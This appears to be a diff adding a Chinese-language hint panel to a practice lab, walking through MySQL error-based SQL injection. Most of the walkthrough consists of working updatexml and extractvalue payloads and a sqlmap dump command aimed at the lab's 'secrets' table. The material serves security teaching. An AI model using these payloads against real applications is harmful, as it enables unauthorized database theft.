@@ -1,0 +1,19 @@
+<div class="hint-thought">
+<h4>思路提示</h4>
+<p>报错注入的核心是<b>服务端把 MySQL 错误信息原样输出了</b>。利用 <code>updatexml()</code>、<code>extractvalue()</code>、<code>floor()</code> 等函数，把要查询的数据拼进 XPath 字符串，函数执行报错时就会把数据"夹带"出来。本关参数被单引号包裹，payload 末尾必须有注释符。</p>
+</div>
+<details class="hint-detail">
+<summary>详细解题过程（点击展开）</summary>
+<div>
+<b>前提：</b>参数被单引号包裹，payload 末尾必须有 <code>-- -</code>（<code>--</code> 后跟一个空格，别省略）。<br>
+<b>1. 确认报错回显：</b><code>?name=admin'</code> &rarr; 页面出现 MySQL 语法错误<br>
+<b>2. 确认可注入（读版本）：</b><code>?name=' or updatexml(1,concat(0x7e,version()),1)-- -</code><br>
+<b>3. 探通关凭证长度：</b><code>?name=' or updatexml(1,concat(0x7e,(select length(secret) from secrets limit 1)),1)-- -</code><br>
+<b>4. 直接读通关凭证：</b><code>?name=' or updatexml(1,concat(0x7e,(select secret from secrets limit 1)),1)-- -</code><br>
+<b>5. extractvalue 备选：</b><code>?name=' or extractvalue(1,concat(0x7e,(select secret from secrets limit 1)))-- -</code><br>
+<b>6. 分段读取（报错约 32 字节截断）：</b><code>?name=' or updatexml(1,concat(0x7e,substr((select secret from secrets limit 1),1,20)),1)-- -</code><br>
+<b>7. 读库名 / 表名：</b><code>?name=' or updatexml(1,concat(0x7e,database()),1)-- -</code><br>
+<b>8. sqlmap 自动化：</b><code>sqlmap -u "{{SITE}}/modules/sqli/error.php?name=admin" --technique=E -D bafanglab -T secrets --dump --batch</code><br>
+<b>小提示：</b>报错内容形如 <code>XPATH syntax error: '~恭喜你完成本关挑战！'</code>，看到 <code>~</code> 后面就是数据；浏览器会把 <code>#</code> 当锚点，所以优先用 <code>-- -</code> 注释，空格也可写成 <code>%20</code>。
+</div>
+</details>
